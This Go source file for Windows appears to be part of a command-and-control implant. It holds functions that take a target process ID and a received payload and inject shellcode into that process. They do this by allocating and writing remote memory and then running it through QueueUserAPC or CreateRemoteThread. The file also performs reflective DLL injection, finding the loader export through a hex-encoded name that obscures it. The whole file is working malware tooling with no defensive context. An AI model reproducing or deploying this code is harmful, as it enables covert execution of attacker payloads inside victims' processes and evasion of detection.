//go:build windows

package packet

import (
	"bytes"
	"encoding/hex"
	"errors"
	"fmt"
	"github.com/Binject/debug/pe"
	"golang.org/x/sys/windows"
	"main/communication"
	"os"
	"strings"
	"unsafe"
)

func InjectProcess(b []byte) ([]byte, error) {
	pid := communication.ReadInt(b)
	sh := b[8:]

	if os.Getpid() == int(pid) {
		return InjectSelf(sh)
	}

	hProcess, err := windows.OpenProcess(windows.STANDARD_RIGHTS_REQUIRED|windows.SYNCHRONIZE|0xFFFF, false, pid)
	if err != nil {
		fmt.Println(err)
		return nil, err
	}
	addr, _, _ := VirtualAllocEx.Call(uintptr(hProcess), 0, uintptr(len(sh)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if addr == 0 {
		fmt.Println("VirtualAlloc Failed")
		return nil, errors.New("VirtualAlloc Failed")
	} else {
		fmt.Println("Alloc: Success")
	}
	_, _, errWriteMemory := WriteProcessMemory.Call(uintptr(hProcess), addr, (uintptr)(unsafe.Pointer(&sh[0])), uintptr(len(sh)))
	if errWriteMemory.Error() != "The operation completed successfully." {
		fmt.Println("WriteMemory: Failed")
		return nil, errWriteMemory
	} else {
		fmt.Println("WriteMemory: Success")
	}
	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtect := VirtualProtectEx.Call(uintptr(hProcess), addr, uintptr(len(sh)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtect.Error() != "The operation completed successfully." {
		fmt.Println("VirtualProtect: Failed")
		return nil, errVirtualProtect
	} else {
		fmt.Println("VirtualProtect: Success")
	}

	/*_, _, errCreateRemoteThreadEx := CreateRemoteThread.Call(uintptr(hProcess), 0, 0, addr, 0, 0, 0)
	if errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
		fmt.Println("VirtualProtect: Failed")
		return nil, errCreateRemoteThreadEx
	} else {
		fmt.Println("VirtualProtect: Success")
	}*/

	//targetThreadId := windows.GetCurrentThreadId()
	hThread, _ := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, pid)
	if hThread != windows.InvalidHandle {
		var threadEntry windows.ThreadEntry32
		threadEntry.Size = uint32(unsafe.Sizeof(threadEntry))
		err := windows.Thread32First(hThread, &threadEntry)
		for err == nil {
			//if threadEntry.Size >= threadEntry.OwnerProcessID+uint32(unsafe.Sizeof(threadEntry.OwnerProcessID)) {
			//fmt.Println(threadEntry)
			if threadEntry.OwnerProcessID == pid {
				//fmt.Println(threadEntry.ThreadID)
				pThread, err := windows.OpenThread(windows.STANDARD_RIGHTS_REQUIRED|windows.SYNCHRONIZE|0xFFFF, false, threadEntry.ThreadID)
				if err != nil && err.Error() != "The operation completed successfully." {
					fmt.Println(err)
					return nil, err
				}
				if pThread != 0 {
					_, _, errQueueUserAPC := QueueUserAPC.Call(addr, uintptr(pThread), 0)
					if errQueueUserAPC.Error() != "The operation completed successfully." {
						fmt.Println("QueueUserAPC: Failed")
						return nil, errQueueUserAPC
					} else {
						fmt.Println("QueueUserAPC: Success")
					}
					_, _, errResumeThread := ResumeThread.Call(uintptr(pThread))
					if errResumeThread != nil {
						fmt.Println(errResumeThread)
					}
					err = windows.CloseHandle(pThread)
					if err != nil {
						fmt.Println(err)
						return nil, err
					}
				}
			}
			//}
			threadEntry.Size = uint32(unsafe.Sizeof(threadEntry))
			err = windows.Thread32Next(hThread, &threadEntry)
		}
	}
	return []byte("Inject success"), nil
}

func InjectProcessRemote(b []byte) ([]byte, error) {
	pid := communication.ReadInt(b)
	sh := b[8:]

	if os.Getpid() == int(pid) {
		return InjectSelf(sh)
	}

	hProcess, err := windows.OpenProcess(windows.STANDARD_RIGHTS_REQUIRED|windows.SYNCHRONIZE|0xFFFF, false, pid)
	if err != nil {
		fmt.Println(err)
		return nil, err
	}

	addr, _, err := VirtualAllocEx.Call(uintptr(hProcess), 0, uintptr(len(sh)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if addr == 0 {
		return nil, errors.New("VirtualAlloc Failed")
	}
	if err != nil && err.Error() != "The operation completed successfully." {
		fmt.Println(err)
	}

	_, _, err = WriteProcessMemory.Call(uintptr(hProcess), addr, (uintptr)(unsafe.Pointer(&sh[0])), uintptr(len(sh)))
	if err != nil && err.Error() != "The operation completed successfully." {
		fmt.Println(err)
	}

	oldProtect := windows.PAGE_READWRITE
	_, _, err = VirtualProtectEx.Call(uintptr(hProcess), addr, uintptr(len(sh)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil && err.Error() != "The operation completed successfully." {
		fmt.Println(err)
	}

	_, _, err = CreateRemoteThread.Call(uintptr(hProcess), 0, 0, addr, 0, 0, 0)
	if err != nil && err.Error() != "The operation completed successfully." {
		fmt.Println(err)
	}

	return []byte("Remote Inject success"), nil
}

func DllInjectProcess(params []byte, b []byte) ([]byte, error) {
	pid := communication.ReadInt(b)
	b = b[8:]

	if os.Getpid() == int(pid) {
		return DllInjectSelf(params, b)
	}

	p, err := pe.NewFile(bytes.NewReader(b))
	if err != nil {
		return nil, err
	}

	ex, e := p.Exports()
	if e != nil {
		return nil, err
	}

	r, _ := hex.DecodeString("7265666c6563746976656c6f61646572")
	var RDIOffset uintptr
	for _, exp := range ex {
		if strings.Contains(strings.ToLower(exp.Name), string(r)) {
			RDIOffset = uintptr(rvaToOffset(p, exp.VirtualAddress))
		}
	}

	hProcess, err := windows.OpenProcess(windows.STANDARD_RIGHTS_REQUIRED|windows.SYNCHRONIZE|0xFFFF, false, pid)
	if err != nil {
		fmt.Println(err)
		return nil, err
	}

	if string(params) == "\x00" {
		ba, _, err := VirtualAllocEx.Call(uintptr(hProcess), 0, uintptr(len(b)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
		if ba == 0 {
			return nil, errors.New("VirtualAlloc Failed")
		}
		if err != nil && err.Error() != "The operation completed successfully." {
			fmt.Println(err)
		}

		_, _, err = WriteProcessMemory.Call(uintptr(hProcess), ba, (uintptr)(unsafe.Pointer(&b[0])), uintptr(len(b)))
		if err != nil && err.Error() != "The operation completed successfully." {
			fmt.Println(err)
		}

		Ldr := ba + RDIOffset

		oldProtect := windows.PAGE_READWRITE
		_, _, err = VirtualProtectEx.Call(uintptr(hProcess), Ldr, uintptr(len(b)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
		if err != nil && err.Error() != "The operation completed successfully." {
			fmt.Println(err)
		}

		_, _, err = CreateRemoteThread.Call(uintptr(hProcess), 0, 0, Ldr, 0, 0, 0)
		if err != nil && err.Error() != "The operation completed successfully." {
			fmt.Println(err)
		}

		return []byte("Remote DllInject success"), nil
	}

	ba, _, err := VirtualAllocEx.Call(uintptr(hProcess), 0, uintptr(len(b)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if ba == 0 {
		return nil, errors.New("VirtualAlloc Failed")
	}
	if err != nil && err.Error() != "The operation completed successfully." {
		fmt.Println(err)
	}

	_, _, err = WriteProcessMemory.Call(uintptr(hProcess), ba, (uintptr)(unsafe.Pointer(&b[0])), uintptr(len(b)))
	if err != nil && err.Error() != "The operation completed successfully." {
		fmt.Println(err)
	}

	_, _, err = WriteProcessMemory.Call(uintptr(hProcess), ba+uintptr(len(b)), (uintptr)(unsafe.Pointer(&params[0])), uintptr(len(b)))
	if err != nil && err.Error() != "The operation completed successfully." {
		fmt.Println(err)
	}

	Ldr := ba + RDIOffset

	oldProtect := windows.PAGE_READWRITE
	_, _, err = VirtualProtectEx.Call(uintptr(hProcess), ba, uintptr(len(b)+len(params)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil && err.Error() != "The operation completed successfully." {
		fmt.Println(err)
	}

	_, _, err = CreateRemoteThread.Call(uintptr(hProcess), 0, 0, Ldr, (uintptr)(unsafe.Pointer(&params[0])), 0, 0, 0)
	if err != nil && err.Error() != "The operation completed successfully." {
		fmt.Println(err)
	}

	return []byte("Remote DllInject success"), nil
}

func DllInjectSelf(params []byte, b []byte) ([]byte, error) {
	p, err := pe.NewFile(bytes.NewReader(b))
	if err != nil {
		return nil, err
	}

	ex, e := p.Exports()
	if e != nil {
		return nil, err
	}

	r, _ := hex.DecodeString("7265666c6563746976656c6f61646572")
	var RDIOffset uintptr
	for _, exp := range ex {
		if strings.Contains(strings.ToLower(exp.Name), string(r)) {
			RDIOffset = uintptr(rvaToOffset(p, exp.VirtualAddress))
		}
	}

	process, err := windows.GetCurrentProcess()
	if err != nil {
		return nil, err
	}

	if string(params) == "\x00" {
		ba, _, err := VirtualAllocEx.Call(uintptr(process), 0, uintptr(len(b)),
			windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
		if ba == 0 {
			fmt.Println("VirtualAlloc Failed")
			return nil, errors.New("VirtualAlloc Failed")
		}
		if err != nil && err.Error() != "The operation completed successfully." {
			return nil, err
		}

		_, _, err = RtlCopyMemory.Call(ba, (uintptr)(unsafe.Pointer(&b[0])), uintptr(len(b)))
		if err != nil && err.Error() != "The operation completed successfully." {
			return nil, err
		}

		writeMem(ba, b)

		Ldr := ba + RDIOffset

		oldProtect := windows.PAGE_READWRITE
		_, _, err = VirtualProtect.Call(ba, uintptr(len(b)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
		if err != nil && err.Error() != "The operation completed successfully." {
			return nil, err
		}

		thread, _, err := CreateThread.Call(0, 0, Ldr, 0, 0, 0)
		if err != nil && err.Error() != "The operation completed successfully." {
			return nil, err
		}

		_, _, err = WaitForSingleObject.Call(thread, 1000)
		if err != nil && err.Error() != "The operation completed successfully." {
			return nil, err
		}

		return []byte("DllInject success"), nil

	}

	ba, _, err := VirtualAllocEx.Call(uintptr(process), 0, uintptr(len(b)+len(params)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if ba == 0 {
		fmt.Println("VirtualAlloc Failed")
		return nil, errors.New("VirtualAlloc Failed")
	}
	if err != nil && err.Error() != "The operation completed successfully." {
		return nil, err
	}

	_, _, err = RtlCopyMemory.Call(ba, (uintptr)(unsafe.Pointer(&b[0])), uintptr(len(b)))
	if err != nil && err.Error() != "The operation completed successfully." {
		return nil, err
	}

	_, _, err = RtlCopyMemory.Call(ba+uintptr(len(b)), (uintptr)(unsafe.Pointer(&params[0])), uintptr(len(params)))
	if err != nil && err.Error() != "The operation completed successfully." {
		return nil, err
	}

	writeMem(ba, b)

	Ldr := ba + RDIOffset

	oldProtect := windows.PAGE_READWRITE
	_, _, err = VirtualProtect.Call(ba, uintptr(len(b)+len(params)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil && err.Error() != "The operation completed successfully." {
		return nil, err
	}

	thread, _, err := CreateThread.Call(0, 0, Ldr, uintptr(unsafe.Pointer(&params[0])), 0, 0)
	if err != nil && err.Error() != "The operation completed successfully." {
		return nil, err
	}

	_, _, err = WaitForSingleObject.Call(thread, 1000)
	if err != nil && err.Error() != "The operation completed successfully." {
		return nil, err
	}

	return []byte("DllInject success"), nil
}

func rvaToOffset(pefile *pe.File, rva uint32) uint32 {
	for _, hdr := range pefile.Sections {
		baseoffset := uint64(rva)
		if baseoffset > uint64(hdr.VirtualAddress) &&
			baseoffset < uint64(hdr.VirtualAddress+hdr.VirtualSize) {
			return rva - hdr.VirtualAddress + hdr.Offset
		}
	}
	return rva
}

func writeMem(destination uintptr, inbuf []byte) {
	for index := uint32(0); index < uint32(len(inbuf)); index++ {
		writePtr := unsafe.Pointer(destination + uintptr(index))
		v := (*byte)(writePtr)
		*v = inbuf[index]
	}
}
